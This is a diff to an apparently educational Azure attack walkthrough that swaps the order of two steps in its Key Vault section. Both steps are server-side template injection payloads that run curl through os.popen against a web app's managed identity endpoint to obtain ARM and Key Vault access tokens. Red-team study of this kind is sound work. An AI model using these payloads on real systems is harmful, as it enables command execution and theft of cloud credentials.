@@ -825,14 +825,14 @@ cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
 ## Keyvault
 We already [enumerated](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti) that the managed identity of the 'vaultfrontend' app service (https://vaultfrontend.azurewebsites.net) can access the keyvault 'ResearchKeyVault'.
 
-To be able to access the keyvault, we need to request a keyvault access token:
-```
-{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
-```
-
 Request a new ARM access token using the below command:
 ```
 {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
+
+To be able to access the keyvault, we need to request a keyvault access token:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
 ```
 
 Now we can connect using Az PowerShell and use both the arm token and keyvault token:
